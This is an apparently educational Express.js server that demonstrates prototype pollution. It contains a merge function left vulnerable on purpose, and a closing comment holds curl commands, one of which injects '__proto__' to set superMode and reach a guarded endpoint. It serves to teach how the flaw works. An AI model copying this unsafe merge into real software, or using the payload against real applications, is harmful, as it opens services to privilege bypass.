const express = require('express');
const bodyParser = require('body-parser')
const path = require('path');
// boring stuff
const PORT = 8080;
const HOST = '0.0.0.0';
const app = express();
app.use(bodyParser.json());

// the vulnerable functions
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
function merge(a, b) {
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}

const admin = {};
let users = {}

let someConfigObject = {
    //superMode = false
    foo:  1.0,
    bar:  "some/path/maybe",
    bax:  "tomfoolery"
}
function validateConfig(config) {
    if(!(config.foo && config.foo > 0 && config.foo < 10)){
        return false
    }
    if(config.superMode) {
        return false
    }
    return true
}

app.post('/updateConfig', (req, res) => {
    var body = JSON.parse(JSON.stringify(req.body));
    // imagine there's some auth function here...
    console.log('before', someConfigObject)
    if(validateConfig(body)) {
        merge(someConfigObject, body)
        console.log('after', someConfigObject)
        res.send('success')
    } else {
        res.send('failure')
    }
});
app.get('/secret', (req, res) => {
    if(someConfigObject.superMode) {
        res.send('secret sauce')
    } else {
        res.send('no secrets for you')
    }
});

//start
app.listen(PORT, HOST);
console.log(`Running on http://${HOST}:${PORT}`);

/*
curl --header 'Content-type: application/json' -d '{"foo":2.0}' localhost:8080/updateConfig
curl --header 'Content-type: application/json' localhost:8080/secret
curl --header 'Content-type: application/json' -d '{"foo":2.0, "__proto__": {"superMode": 1}}' localhost:8080/updateConfig
*/